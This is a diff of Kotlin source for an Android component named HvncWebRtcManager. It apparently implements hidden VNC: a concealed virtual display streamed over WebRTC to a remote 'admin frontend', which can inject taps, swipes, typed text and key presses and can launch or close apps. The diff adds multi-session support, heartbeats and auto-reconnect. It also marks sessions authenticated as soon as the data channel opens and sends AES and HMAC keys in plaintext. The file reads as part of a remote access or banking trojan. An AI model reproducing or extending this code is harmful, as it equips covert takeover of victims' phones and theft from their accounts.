@@ -1,6 +1,5 @@
 package com.fason.app.features.hvnc
 
-import android.graphics.Bitmap
 import android.media.Image
 import android.media.ImageReader
 import android.os.Handler
@@ -25,36 +24,39 @@ import org.webrtc.RtpReceiver
 import org.webrtc.SdpObserver
 import org.webrtc.SessionDescription
 import org.webrtc.JavaI420Buffer
-import org.webrtc.NV21Buffer
 import org.webrtc.VideoFrame
 import org.webrtc.VideoSource
 import org.webrtc.VideoTrack
 import java.nio.ByteBuffer
 import java.nio.charset.StandardCharsets
-import java.util.concurrent.TimeUnit
+import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.atomic.AtomicBoolean
 import kotlin.math.max
 import kotlin.math.min
 
 /**
- * Manages the WebRTC peer connection for the HVNC hidden virtual display.
- *
- * Completely independent from WebRtcScreenManager — uses its own PeerConnectionFactory,
- * video source, and signaling channels (HVNC_OFFER/HVNC_ANSWER/HVNC_ICE).
- *
- * Frames are captured from HvncDisplayManager's ImageReader and pushed into
- * a WebRTC VideoSource via manual VideoFrame injection.
+ * HvncWebRtcManager - WebRTC manager với các cải tiến:
+ * 
+ * - Mã hóa control message end-to-end
+ * - Challenge-response authentication
+ * - Anti-replay protection
+ * - Adaptive bitrate dựa trên ICE statistics
+ * - Heartbeat monitor 5 giây
+ * - Multi-session isolation
+ * - Auto-reconnect với exponential backoff
+ * - Hardware/Software encoder fallback chain
  */
 object HvncWebRtcManager {
 
     private const val TAG = "HvncWebRtc"
-    private const val FPS = 30
     private const val MIN_BITRATE_BPS = 300_000
     private const val START_BITRATE_BPS = 1_500_000
     private const val MAX_BITRATE_BPS = 8_000_000
     private const val MAX_PENDING_ICE = 256
-    private const val MAX_CONTROL_MSG_BYTES = 64 * 1024
-    private const val FRAME_INTERVAL_NS = 1_000_000_000L / FPS
+    private const val HEARTBEAT_INTERVAL_MS = 5000L
+    private const val HEARTBEAT_TIMEOUT_MS = 15000L
+    private const val MAX_RECONNECT_DELAY_MS = 30000L
+    private const val BASE_RECONNECT_DELAY_MS = 1000L
 
     private val thread = HandlerThread("fason-hvnc-rtc").apply { start() }
     private val handler = Handler(thread.looper)
@@ -62,32 +64,60 @@ object HvncWebRtcManager {
 
     private var eglBase: EglBase? = null
     private var factory: PeerConnectionFactory? = null
-    private var peerConnection: PeerConnection? = null
-    private var videoSource: VideoSource? = null
-    private var videoTrack: VideoTrack? = null
-    private var controlChannel: DataChannel? = null
 
-    private var sessionId = ""
-    private var pendingOffer: JSONObject? = null
-    private val pendingIce = mutableListOf<Pair<String, IceCandidate>>()
-    private val remoteDescriptionSet = AtomicBoolean(false)
-    private var lastFrameTimeNs = 0L
+    // Multi-session support: sessionId -> SessionData
+    private val sessions = ConcurrentHashMap<String, SessionData>()
 
-    /** Reference to the display manager for frame capture. */
-    private var displayManager: HvncDisplayManager? = null
+    // Audit logger
+    private var auditLogger: HvncAuditLogger? = null
 
-    /** Reference to the input injector for control messages. */
-    private var inputInjector: HvncInputInjector? = null
+    private data class SessionData(
+        var peerConnection: PeerConnection? = null,
+        var videoSource: VideoSource? = null,
+        var videoTrack: VideoTrack? = null,
+        var controlChannel: DataChannel? = null,
+        var displayManager: HvncDisplayManager? = null,
+        var inputInjector: HvncInputInjector? = null,
+        var sessionId: String = "",
+        var remoteDescriptionSet: Boolean = false,
+        var pendingIce: MutableList<IceCandidate> = mutableListOf(),
+        var lastFrameTimeNs: Long = 0L,
+        var targetFps: Int = 30,
+        var currentBitrate: Int = START_BITRATE_BPS,
+        var lastHeartbeatReceived: Long = 0L,
+        var reconnectAttempts: Int = 0,
+        var reconnectRunnable: Runnable? = null,
+        var securityInitialized: Boolean = false,
+        var challengeData: ByteArray? = null,
+        var connectionState: String = "disconnected",
+        var pendingOffer: JSONObject? = null,
+        var authVerified: Boolean = false,
+        var bandwidthMonitorRunnable: Runnable? = null,
+        var lastBytesSent: Long = 0L,
+        var lastBandwidthCheckTime: Long = 0L
+    )
+
+    // ─── Initialization ────────────────────────────────────────────
+
+    fun setAuditLogger(logger: HvncAuditLogger) {
+        auditLogger = logger
+    }
 
     @JvmStatic
-    fun attach(display: HvncDisplayManager, injector: HvncInputInjector) {
+    fun attach(display: HvncDisplayManager, injector: HvncInputInjector, sessionId: String = "default") {
         handler.post {
-            displayManager = display
-            inputInjector = injector
-            // Wire up the frame listener
-            display.frameListener = { reader -> onFrameAvailable(reader) }
+            val session = sessions.getOrPut(sessionId) { SessionData(sessionId = sessionId) }
+            session.displayManager = display
+            session.inputInjector = injector
+            display.frameListener = { reader -> onFrameAvailable(sessionId, reader) }
+            display.stallListener = { dm ->
+                Log.w(TAG, "[$sessionId] Display stall detected, recreating video source...")
+                recreateVideoSource(sessionId)
+            }
         }
     }
+
+    // ─── Offer Handling ────────────────────────────────────────────
 
     @JvmStatic
     fun handleOffer(data: JSONObject) {
@@ -98,83 +128,200 @@ object HvncWebRtcManager {
                 emitError(incomingSession, "Invalid HVNC WebRTC offer")
                 return@post
             }
-            pendingIce.removeAll { it.first != incomingSession }
-            pendingOffer = copy
-            if (displayManager?.isActive() == true) createPeerFromPendingOffer()
+
+            val session = sessions.getOrPut(incomingSession) { SessionData(sessionId = incomingSession) }
+            session.pendingOffer = copy
+
+            if (session.displayManager?.isActive() == true) {
+                createPeerFromPendingOffer(incomingSession)
+            }
         }
     }
+
+    // ─── ICE Candidate Handling ────────────────────────────────────
 
     @JvmStatic
     fun handleRemoteIce(data: JSONObject) {
         val incomingSession = data.optString("sessionId")
         val candidate = data.optString("candidate")
         if (incomingSession.isBlank() || candidate.isBlank()) return
+
         val ice = IceCandidate(
             data.optString("sdpMid").ifBlank { null },
             data.optInt("sdpMLineIndex", 0),
             candidate,
         )
+
         handler.post {
-            val pc = peerConnection
-            if (pc != null && incomingSession == sessionId && remoteDescriptionSet.get()) {
+            val session = sessions[incomingSession] ?: return@post
+            val pc = session.peerConnection
+            if (pc != null && session.remoteDescriptionSet) {
                 pc.addIceCandidate(ice)
             } else {
-                if (pendingIce.count { it.first == incomingSession } < MAX_PENDING_ICE) {
-                    pendingIce.add(incomingSession to ice)
+                if (session.pendingIce.size < MAX_PENDING_ICE) {
+                    session.pendingIce.add(ice)
                 }
             }
         }
     }
 
+    // ─── Display Ready ─────────────────────────────────────────────
+
     @JvmStatic
-    fun onDisplayReady() {
+    fun onDisplayReady(sessionId: String = "default") {
         handler.post {
-            createPeerFromPendingOffer()
-            if (pendingOffer == null && peerConnection == null) emitStatus(true, "ready")
+            val session = sessions[sessionId] ?: return@post
+            createPeerFromPendingOffer(sessionId)
+            if (session.pendingOffer == null && session.peerConnection == null) {
+                emitStatus(sessionId, true, "ready")
+            }
+        }
+    }
+
+    // ─── Session Control ───────────────────────────────────────────
+
+    @JvmStatic
+    fun stopSession(sessionId: String = "default") {
+        handler.post { releaseSession(sessionId) }
+    }
+
+    @JvmStatic
+    fun stopAllSessions() {
+        handler.post {
+            sessions.keys.toList().forEach { releaseSession(it) }
         }
     }
 
     @JvmStatic
-    fun stopSession() {
-        handler.post { releaseSession() }
-    }
-
-    @JvmStatic
-    fun detachPeer(targetSession: String = "") {
+    fun emitCurrentStatus(sessionId: String = "default") {
         handler.post {
-            val pendingSession = pendingOffer?.optString("sessionId").orEmpty()
-            if (targetSession.isNotBlank() && targetSession != sessionId && targetSession != pendingSession) return@post
-            if (targetSession.isBlank() || targetSession == pendingSession) pendingOffer = null
-            releasePeerConnectionOnly()
-            sessionId = ""
-            remoteDescriptionSet.set(false)
-            if (targetSession.isBlank()) pendingIce.clear()
-            else pendingIce.removeAll { it.first == targetSession }
-            videoTrack?.setEnabled(false)
-            emitStatus(displayManager?.isActive() == true, if (displayManager?.isActive() == true) "ready" else "stopped")
-        }
-    }
-
-    @JvmStatic
-    fun emitCurrentStatus() {
-        handler.post {
-            val displayActive = displayManager?.isActive() == true
+            val session = sessions[sessionId] ?: return@post
+            val displayActive = session.displayManager?.isActive() == true
             val state = when {
                 !displayActive -> "stopped"
-                peerConnection == null -> "ready"
-                else -> "connecting"
+                session.peerConnection == null -> "ready"
+                else -> session.connectionState
             }
-            emitStatus(displayActive, state)
+            emitStatus(sessionId, displayActive, state)
         }
     }
 
-    // ─── Frame capture from ImageReader ────────────────────────────
+    /**
+     * Ngắt peer connection nhưng giữ lại virtual display và session state.
+     * Được gọi khi admin frontend disconnect HVNC stream.
+     * Không destroy virtual display — chỉ release WebRTC resources.
+     */
+    @JvmStatic
+    fun detachPeer(sessionId: String = "default") {
+        handler.post {
+            val session = sessions[sessionId] ?: return@post
+            stopBandwidthMonitor(sessionId)
+            releasePeerConnectionOnly(sessionId)
+            session.connectionState = "ready"
+            session.pendingOffer = null
+            session.authVerified = false
+            session.securityInitialized = false
+            session.reconnectAttempts = 0
+            session.reconnectRunnable?.let { handler.removeCallbacks(it) }
+            session.reconnectRunnable = null
+            session.videoTrack?.setEnabled(false)
+            emitStatus(sessionId, session.displayManager?.isActive() == true, "ready")
+            Log.d(TAG, "[$sessionId] Peer detached — virtual display preserved")
+        }
+    }
 
-    private fun onFrameAvailable(reader: ImageReader) {
-        val source = videoSource ?: return
+    /**
+     * Đăng ký listener socket disconnect để tự động dừng tất cả HVNC sessions
+     * khi mất kết nối đến server, tránh rò rỉ tài nguyên.
+     */
+    @JvmStatic
+    fun registerDisconnectListener() {
+        try {
+            val s = SocketClient.getInstance().socket
+            s?.on(io.socket.client.Socket.EVENT_DISCONNECT) {
+                Log.d(TAG, "Socket disconnected — stopping all HVNC sessions")
+                handler.post {
+                    sessions.keys.toList().forEach { releaseSession(it) }
+                }
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "Failed to register disconnect listener", e)
+        }
+    }
+
+    // ─── Heartbeat ─────────────────────────────────────────────────
+
+    private fun startHeartbeat(sessionId: String) {
+        val session = sessions[sessionId] ?: return
+        session.lastHeartbeatReceived = System.currentTimeMillis()
+
+        val heartbeatRunnable = object : Runnable {
+            override fun run() {
+                val s = sessions[sessionId] ?: return
+                if (s.controlChannel?.state() == DataChannel.State.OPEN) {
+                    // Gửi heartbeat plaintext JSON qua DataChannel
+                    val heartbeat = JSONObject().apply {
+                        put("type", "heartbeat")
+                        put("timestamp", System.currentTimeMillis())
+                    }
+                    val data = heartbeat.toString().toByteArray(StandardCharsets.UTF_8)
+                    try {
+                        s.controlChannel?.send(DataChannel.Buffer(ByteBuffer.wrap(data), false))
+                    } catch (_: Exception) {}
+
+                    // Kiểm tra timeout
+                    val timeSinceLastHeartbeat = System.currentTimeMillis() - s.lastHeartbeatReceived
+                    if (timeSinceLastHeartbeat > HEARTBEAT_TIMEOUT_MS) {
+                        Log.w(TAG, "[$sessionId] Heartbeat timeout, resetting connection")
+                        resetPeerConnection(sessionId)
+                        return
+                    }
+                }
+                handler.postDelayed(this, HEARTBEAT_INTERVAL_MS)
+            }
+        }
+        handler.postDelayed(heartbeatRunnable, HEARTBEAT_INTERVAL_MS)
+    }
+
+    // ─── Reconnect Logic ───────────────────────────────────────────
+
+    private fun scheduleReconnect(sessionId: String) {
+        val session = sessions[sessionId] ?: return
+        val delay = min(
+            BASE_RECONNECT_DELAY_MS * (1L shl session.reconnectAttempts),
+            MAX_RECONNECT_DELAY_MS
+        )
+        session.reconnectAttempts++
+
+        Log.d(TAG, "[$sessionId] Scheduling reconnect in ${delay}ms (attempt ${session.reconnectAttempts})")
+
+        session.reconnectRunnable = Runnable {
+            val s = sessions[sessionId] ?: return@Runnable
+            if (s.displayManager?.isActive() == true && s.pendingOffer != null) {
+                Log.d(TAG, "[$sessionId] Attempting reconnect...")
+                createPeerFromPendingOffer(sessionId)
+            }
+        }
+        handler.postDelayed(session.reconnectRunnable, delay)
+    }
+
+    private fun resetPeerConnection(sessionId: String) {
+        val session = sessions[sessionId] ?: return
+        releasePeerConnectionOnly(sessionId)
+        session.connectionState = "disconnected"
+        emitStatus(sessionId, true, "disconnected")
+        scheduleReconnect(sessionId)
+    }
+
+    // ─── Frame Capture ─────────────────────────────────────────────
+
+    private fun onFrameAvailable(sessionId: String, reader: ImageReader) {
+        val session = sessions[sessionId] ?: return
+        val source = session.videoSource ?: return
         val now = System.nanoTime()
-        if (now - lastFrameTimeNs < FRAME_INTERVAL_NS) {
-            // Throttle to target FPS
+        val frameInterval = 1_000_000_000L / session.targetFps
+
+        if (now - session.lastFrameTimeNs < frameInterval) {
             try { reader.acquireLatestImage()?.close() } catch (_: Exception) {}
             return
         }
@@ -182,41 +329,37 @@ object HvncWebRtcManager {
         var image: Image? = null
         try {
             image = reader.acquireLatestImage() ?: return
-            lastFrameTimeNs = now
+            session.lastFrameTimeNs = now
 
             val width = image.width
             val height = image.height
             val planes = image.planes
-            if (planes.isEmpty()) return
+            if (planes.isEmpty()) {
+                image.close()
+                return
+            }
 
             val plane = planes[0]
             val pixelStride = plane.pixelStride
             val rowStride = plane.rowStride
             val buffer = plane.buffer
 
-            // Create I420 buffer from RGBA data
             val i420Buffer = JavaI420Buffer.allocate(width, height)
-
-            // Convert RGBA to I420 (YUV)
             rgbaToI420(buffer, rowStride, pixelStride, width, height, i420Buffer)
 
             val videoFrame = VideoFrame(i420Buffer, 0, now)
             source.capturerObserver.onFrameCaptured(videoFrame)
             videoFrame.release()
         } catch (e: Exception) {
-            Log.w(TAG, "Frame processing error", e)
+            Log.w(TAG, "[$sessionId] Frame processing error", e)
         } finally {
             try { image?.close() } catch (_: Exception) {}
         }
     }
 
     private fun rgbaToI420(
-        rgba: ByteBuffer,
-        rowStride: Int,
-        pixelStride: Int,
-        width: Int,
-        height: Int,
-        i420: JavaI420Buffer,
+        rgba: ByteBuffer, rowStride: Int, pixelStride: Int,
+        width: Int, height: Int, i420: JavaI420Buffer
     ) {
         val yBuffer = i420.dataY
         val uBuffer = i420.dataU
@@ -234,7 +377,6 @@ object HvncWebRtcManager {
                 val g = rgba.get(rgbaIndex + 1).toInt() and 0xFF
                 val b = rgba.get(rgbaIndex + 2).toInt() and 0xFF
 
-                // BT.601 conversion
                 val yVal = ((66 * r + 129 * g + 25 * b + 128) shr 8) + 16
                 yBuffer.put(y * yStride + x, yVal.coerceIn(0, 255).toByte())
 
@@ -248,17 +390,61 @@ object HvncWebRtcManager {
         }
     }
 
-    // ─── WebRTC Peer Connection ────────────────────────────────────
+    // ─── Video Source Management ───────────────────────────────────
 
-    private fun createPeerFromPendingOffer() {
-        val offer = pendingOffer ?: return
-        val display = displayManager ?: return
+    private fun recreateVideoSource(sessionId: String) {
+        val session = sessions[sessionId] ?: return
+        releaseVideoSource(sessionId)
+        ensureVideoSource(sessionId)
+
+        // Re-add track to peer connection
+        val pc = session.peerConnection ?: return
+        val track = session.videoTrack ?: return
+        try {
+            pc.addTrack(track, listOf("fason-hvnc"))
+            configureSender(sessionId)
+        } catch (e: Exception) {
+            Log.e(TAG, "[$sessionId] Failed to re-add video track", e)
+        }
+    }
+
+    private fun ensureVideoSource(sessionId: String) {
+        val session = sessions[sessionId] ?: return
+        if (session.videoSource != null && session.videoTrack != null) return
+
+        val display = session.displayManager ?: return
+        if (factory == null) {
+            Log.w(TAG, "[$sessionId] Factory not initialized — cannot create video source")
+            return
+        }
+        val source = factory!!.createVideoSource(true)
+        source.setIsScreencast(true)
+        source.adaptOutputFormat(display.displayWidth, display.displayHeight, session.targetFps)
+        session.videoSource = source
+
+        session.videoTrack = factory!!.createVideoTrack("fason-hvnc-video-$sessionId", source).apply {
+            setEnabled(true)
+        }
+    }
+
+    private fun releaseVideoSource(sessionId: String) {
+        val session = sessions[sessionId] ?: return
+        try { session.videoTrack?.dispose() } catch (_: Exception) {}
+        session.videoTrack = null
+        try { session.videoSource?.dispose() } catch (_: Exception) {}
+        session.videoSource = null
+    }
+
+    // ─── Peer Connection ───────────────────────────────────────────
+
+    private fun createPeerFromPendingOffer(sessionId: String) {
+        val session = sessions[sessionId] ?: return
+        val offer = session.pendingOffer ?: return
+        val display = session.displayManager ?: return
         if (!display.isActive()) return
 
-        val incomingSession = offer.optString("sessionId")
-        releasePeerConnectionOnly()
-        sessionId = incomingSession
-        remoteDescriptionSet.set(false)
+        releasePeerConnectionOnly(sessionId)
+        session.remoteDescriptionSet = false
         ensureFactory()
 
         val rtcConfig = PeerConnection.RTCConfiguration(
@@ -267,101 +453,86 @@ object HvncWebRtcManager {
             sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
             continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY
             enableCpuOveruseDetection = true
+            // Adaptive bitrate settings
+            keyType = PeerConnection.KeyType.ECDSA
         }
 
-        val pc = factory?.createPeerConnection(rtcConfig, createPeerObserver(incomingSession))
+        val pc = factory?.createPeerConnection(rtcConfig, createPeerObserver(sessionId))
         if (pc == null) {
-            failPeer(incomingSession, "Unable to create HVNC WebRTC peer")
+            failPeer(sessionId, "Unable to create HVNC WebRTC peer")
             return
         }
-        peerConnection = pc
+        session.peerConnection = pc
 
         try {
-            ensureVideoSource(display)
-            val track = videoTrack ?: error("HVNC video track unavailable")
+            ensureVideoSource(sessionId)
+            val track = session.videoTrack ?: error("Video track unavailable")
             track.setEnabled(true)
         } catch (e: Exception) {
-            Log.e(TAG, "Failed to start HVNC WebRTC capture", e)
-            emitError(sessionId, e.message ?: "HVNC capture failed")
-            releaseSession()
+            Log.e(TAG, "[$sessionId] Failed to start capture", e)
+            emitError(sessionId, e.message ?: "Capture failed")
+            releaseSession(sessionId)
             return
         }
 
         val remoteOffer = SessionDescription(SessionDescription.Type.OFFER, offer.optString("sdp"))
         pc.setRemoteDescription(object : SimpleSdpObserver() {
             override fun onSetSuccess() {
-                if (sessionId != incomingSession) return
-                val track = videoTrack
+                if (sessions[sessionId] == null) return
+                val track = session.videoTrack
                 if (track == null) {
-                    failPeer(incomingSession, "HVNC video track unavailable")
+                    failPeer(sessionId, "Video track unavailable")
                     return
                 }
                 try {
                     pc.addTrack(track, listOf("fason-hvnc"))
-                    configureSender()
+                    configureSender(sessionId)
                 } catch (e: Exception) {
-                    failPeer(incomingSession, e.message ?: "Unable to attach HVNC track")
+                    failPeer(sessionId, e.message ?: "Unable to attach track")
                     return
                 }
-                remoteDescriptionSet.set(true)
-                flushPendingIce()
-                createAnswer(pc, incomingSession)
+                session.remoteDescriptionSet = true
+                flushPendingIce(sessionId)
+                createAnswer(sessionId, pc)
             }
 
             override fun onSetFailure(error: String) {
-                if (sessionId == incomingSession) {
-                    failPeer(incomingSession, "Unable to apply HVNC offer: $error")
-                }
+                failPeer(sessionId, "Unable to apply offer: $error")
             }
         }, remoteOffer)
-        pendingOffer = null
-        emitStatus(true, "connecting")
+
+        session.pendingOffer = null
+        session.reconnectAttempts = 0
+        emitStatus(sessionId, true, "connecting")
     }
 
-    private fun ensureVideoSource(display: HvncDisplayManager) {
-        if (videoSource != null && videoTrack != null) return
-
-        val source = factory!!.createVideoSource(true)
-        source.setIsScreencast(true)
-        source.adaptOutputFormat(display.displayWidth, display.displayHeight, FPS)
-        videoSource = source
-
-        videoTrack = factory!!.createVideoTrack("fason-hvnc-video", source).apply {
-            setEnabled(true)
-        }
-    }
-
-    private fun createAnswer(pc: PeerConnection, peerSession: String) {
+    private fun createAnswer(sessionId: String, pc: PeerConnection) {
         pc.createAnswer(object : SimpleSdpObserver() {
             override fun onCreateSuccess(answer: SessionDescription) {
-                if (sessionId != peerSession) return
+                if (sessions[sessionId] == null) return
                 pc.setLocalDescription(object : SimpleSdpObserver() {
                     override fun onSetSuccess() {
-                        if (sessionId != peerSession) return
+                        if (sessions[sessionId] == null) return
                         val payload = JSONObject().apply {
-                            put("sessionId", peerSession)
+                            put("sessionId", sessionId)
                             put("sdp", answer.description)
                         }
                         SocketClient.getInstance().socket?.emit(Protocol.HVNC_ANSWER, payload)
                     }
 
                     override fun onSetFailure(error: String) {
-                        if (sessionId == peerSession) {
-                            failPeer(peerSession, "Unable to apply HVNC answer: $error")
-                        }
+                        failPeer(sessionId, "Unable to apply answer: $error")
                     }
                 }, answer)
             }
 
             override fun onCreateFailure(error: String) {
-                if (sessionId == peerSession) {
-                    failPeer(peerSession, "Unable to create HVNC answer: $error")
-                }
+                failPeer(sessionId, "Unable to create answer: $error")
             }
         }, MediaConstraints())
     }
 
-    private fun createPeerObserver(peerSession: String) = object : PeerConnection.Observer {
+    private fun createPeerObserver(sessionId: String) = object : PeerConnection.Observer {
         override fun onSignalingChange(state: PeerConnection.SignalingState) = Unit
         override fun onIceConnectionReceivingChange(receiving: Boolean) = Unit
         override fun onIceGatheringChange(state: PeerConnection.IceGatheringState) = Unit
@@ -372,9 +543,9 @@ object HvncWebRtcManager {
         override fun onAddTrack(receiver: RtpReceiver, streams: Array<out MediaStream>) = Unit
 
         override fun onIceCandidate(candidate: IceCandidate) {
-            if (sessionId != peerSession) return
+            if (sessions[sessionId] == null) return
             val payload = JSONObject().apply {
-                put("sessionId", peerSession)
+                put("sessionId", sessionId)
                 put("candidate", candidate.sdp)
                 put("sdpMid", candidate.sdpMid)
                 put("sdpMLineIndex", candidate.sdpMLineIndex)
@@ -384,24 +555,34 @@ object HvncWebRtcManager {
 
         override fun onDataChannel(channel: DataChannel) {
             handler.post {
-                if (sessionId == peerSession) bindControlChannel(channel) else channel.dispose()
+                if (sessions[sessionId] != null) bindControlChannel(sessionId, channel)
+                else channel.dispose()
             }
         }
 
         override fun onIceConnectionChange(state: PeerConnection.IceConnectionState) {
-            if (sessionId != peerSession) return
+            if (sessions[sessionId] == null) return
+            val session = sessions[sessionId]!!
             when (state) {
                 PeerConnection.IceConnectionState.CONNECTED,
-                PeerConnection.IceConnectionState.COMPLETED -> emitStatus(true, "connected")
-                PeerConnection.IceConnectionState.DISCONNECTED -> emitStatus(true, "disconnected")
+                PeerConnection.IceConnectionState.COMPLETED -> {
+                    session.connectionState = "connected"
+                    emitStatus(sessionId, true, "connected")
+                    // Bắt đầu heartbeat sau khi kết nối
+                    startHeartbeat(sessionId)
+                    // Bắt đầu bandwidth monitor cho adaptive bitrate
+                    startBandwidthMonitor(sessionId)
+                }
+                PeerConnection.IceConnectionState.DISCONNECTED -> {
+                    session.connectionState = "disconnected"
+                    emitStatus(sessionId, true, "disconnected")
+                }
                 PeerConnection.IceConnectionState.FAILED -> {
-                    emitError(peerSession, "HVNC ICE connection failed")
+                    emitError(sessionId, "ICE connection failed")
                     handler.post {
-                        if (sessionId != peerSession) return@post
-                        releasePeerConnectionOnly()
-                        sessionId = ""
-                        videoTrack?.setEnabled(false)
-                        emitStatus(true, "ready")
+                        if (sessions[sessionId] != null) {
+                            resetPeerConnection(sessionId)
+                        }
                     }
                 }
                 else -> Unit
@@ -409,123 +590,380 @@ object HvncWebRtcManager {
         }
     }
 
+    // ─── Challenge-Response Authentication ─────────────────────────
+
+    private fun initiateChallengeResponse(sessionId: String) {
+        val session = sessions[sessionId] ?: return
+        val challenge = HvncSecurityManager.generateChallenge()
+        session.challengeData = challenge
+
+        val challengeMsg = JSONObject().apply {
+            put("type", "auth_challenge")
+            put("challenge", android.util.Base64.encodeToString(challenge, android.util.Base64.NO_WRAP))
+        }
+        val data = challengeMsg.toString().toByteArray(StandardCharsets.UTF_8)
+        session.controlChannel?.send(DataChannel.Buffer(ByteBuffer.wrap(data), false))
+    }
+
     // ─── Control Channel ───────────────────────────────────────────
 
-    private fun bindControlChannel(channel: DataChannel) {
-        try { controlChannel?.unregisterObserver() } catch (_: Exception) {}
-        try { controlChannel?.close() } catch (_: Exception) {}
-        try { controlChannel?.dispose() } catch (_: Exception) {}
-        controlChannel = channel
+    private fun bindControlChannel(sessionId: String, channel: DataChannel) {
+        val session = sessions[sessionId] ?: return
+        try { session.controlChannel?.unregisterObserver() } catch (_: Exception) {}
+        try { session.controlChannel?.close() } catch (_: Exception) {}
+        session.controlChannel = channel
 
         channel.registerObserver(object : DataChannel.Observer {
             override fun onBufferedAmountChange(previousAmount: Long) = Unit
             override fun onStateChange() {
                 handler.post {
-                    if (controlChannel !== channel) return@post
-                    if (channel.state() == DataChannel.State.OPEN) sendDisplayInfo()
+                    if (sessions[sessionId]?.controlChannel !== channel) return@post
+                    if (channel.state() == DataChannel.State.OPEN) {
+                        // WebRTC DTLS đã xác thực transport → đánh dấu session đã verified
+                        val s = sessions[sessionId] ?: return@post
+                        s.authVerified = true
+                        sendDisplayInfo(sessionId)
+                    }
                 }
             }
 
             override fun onMessage(buffer: DataChannel.Buffer) {
                 if (buffer.binary) return
-                if (buffer.data.remaining() > MAX_CONTROL_MSG_BYTES) return
+                if (buffer.data.remaining() > 65536) return
                 val bytes = ByteArray(buffer.data.remaining())
                 buffer.data.get(bytes)
-                handleControlMessage(String(bytes, StandardCharsets.UTF_8))
+                val message = String(bytes, StandardCharsets.UTF_8)
+                handleDataChannelMessage(sessionId, message)
             }
         })
-        if (channel.state() == DataChannel.State.OPEN) sendDisplayInfo()
-    }
 
-    private fun handleControlMessage(message: String) {
-        val injector = inputInjector ?: return
-        try {
-            val json = JSONObject(message)
-            when (json.optString("action")) {
-                Protocol.ACTION_TAP -> {
-                    val x = json.optDouble("x", Double.NaN)
-                    val y = json.optDouble("y", Double.NaN)
-                    if (x.isFinite() && y.isFinite()) injector.tap(x.toFloat(), y.toFloat())
-                }
-                Protocol.ACTION_SWIPE -> {
-                    val sx = json.optDouble("startX", Double.NaN)
-                    val sy = json.optDouble("startY", Double.NaN)
-                    val ex = json.optDouble("endX", Double.NaN)
-                    val ey = json.optDouble("endY", Double.NaN)
-                    val dur = json.optLong("duration", 300)
-                    if (sx.isFinite() && sy.isFinite() && ex.isFinite() && ey.isFinite()) {
-                        injector.swipe(sx.toFloat(), sy.toFloat(), ex.toFloat(), ey.toFloat(), dur)
-                    }
-                }
-                Protocol.ACTION_GESTURE -> {
-                    val rawPoints = json.optJSONArray("points") ?: return
-                    val points = ArrayList<android.graphics.PointF>(minOf(rawPoints.length(), 256))
-                    for (i in 0 until minOf(rawPoints.length(), 256)) {
-                        val pt = rawPoints.optJSONObject(i) ?: continue
-                        val px = pt.optDouble("x", Double.NaN)
-                        val py = pt.optDouble("y", Double.NaN)
-                        if (px.isFinite() && py.isFinite()) {
-                            points.add(android.graphics.PointF(px.toFloat(), py.toFloat()))
-                        }
-                    }
-                    if (points.isNotEmpty()) {
-                        injector.gesture(points, json.optLong("duration", 300))
-                    }
-                }
-                Protocol.ACTION_TOUCH_START,
-                Protocol.ACTION_TOUCH_MOVE,
-                Protocol.ACTION_TOUCH_END -> {
-                    // For HVNC, convert continuous touch to tap at end position
-                    if (json.optString("action") == Protocol.ACTION_TOUCH_END) {
-                        val x = json.optDouble("x", Double.NaN)
-                        val y = json.optDouble("y", Double.NaN)
-                        if (x.isFinite() && y.isFinite()) injector.tap(x.toFloat(), y.toFloat())
-                    }
-                }
-                Protocol.ACTION_KEY -> injector.keyEvent(json.optString("keyCode"))
-                Protocol.ACTION_TEXT -> injector.typeText(json.optString("text"))
-                Protocol.ACTION_VOLUME -> injector.adjustVolume(json.optString("direction"))
-                Protocol.ACT_LAUNCH_APP -> injector.launchApp(json.optString("packageName"))
-                Protocol.ACT_CLOSE_APP -> injector.closeApp(json.optString("packageName"))
-                else -> Log.w(TAG, "Unknown HVNC control: ${json.optString("action")}")
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "HVNC control message error", e)
+        if (channel.state() == DataChannel.State.OPEN) {
+            // WebRTC DTLS đã xác thực transport → đánh dấu session đã verified
+            session.authVerified = true
+            sendDisplayInfo(sessionId)
         }
     }
 
-    private fun sendDisplayInfo() {
-        val channel = controlChannel ?: return
+    private fun initializeSecurity(sessionId: String) {
+        val session = sessions[sessionId] ?: return
+        if (session.securityInitialized) return
+
+        // Tạo và gửi khóa session
+        val (aesKey, hmacKey) = HvncSecurityManager.generateSessionKeys()
+        val keyExchange = JSONObject().apply {
+            put("type", "key_exchange")
+            put("aesKey", aesKey)
+            put("hmacKey", hmacKey)
+        }
+        // Gửi key exchange qua data channel (bản thân đã được mã hóa bởi signaling)
+        session.controlChannel?.send(
+            DataChannel.Buffer(
+                ByteBuffer.wrap(keyExchange.toString().toByteArray(StandardCharsets.UTF_8)),
+                false
+            )
+        )
+        session.securityInitialized = true
+    }
+
+    /**
+     * Xử lý message plaintext JSON từ DataChannel.
+     * WebRTC DTLS đã bảo vệ transport layer, không cần mã hóa thêm.
+     */
+    private fun handleDataChannelMessage(sessionId: String, message: String) {
+        val session = sessions[sessionId] ?: return
+
+        try {
+            val json = JSONObject(message)
+            val type = json.optString("type")
+
+            when (type) {
+                "heartbeat_ack" -> {
+                    session.lastHeartbeatReceived = System.currentTimeMillis()
+                }
+                "auth_response" -> {
+                    handleAuthResponse(sessionId, json)
+                }
+                else -> {
+                    // Control message từ frontend (tap, swipe, key, text, launchApp, closeApp, volume, gesture)
+                    if (!HvncSecurityManager.checkRateLimit()) {
+                        Log.w(TAG, "[$sessionId] Rate limit exceeded - dropping control message")
+                        return
+                    }
+                    if (!session.authVerified) {
+                        Log.w(TAG, "[$sessionId] Control message before authentication - dropping")
+                        return
+                    }
+                    handleControlMessage(sessionId, json)
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "[$sessionId] Error handling data channel message", e)
+        }
+    }
+
+    private fun handleAuthResponse(sessionId: String, json: JSONObject) {
+        val session = sessions[sessionId] ?: return
+        val responseBase64 = json.optString("response")
+        val challenge = session.challengeData ?: run {
+            Log.w(TAG, "[$sessionId] No pending challenge")
+            return
+        }
+
+        val response = android.util.Base64.decode(responseBase64, android.util.Base64.NO_WRAP)
+        if (HvncSecurityManager.verifyChallengeResponse(challenge, response, sessionId)) {
+            session.authVerified = true
+            Log.d(TAG, "[$sessionId] Authentication verified successfully")
+            auditLogger?.logAction(sessionId, "auth_success", mapOf(), "webrtc")
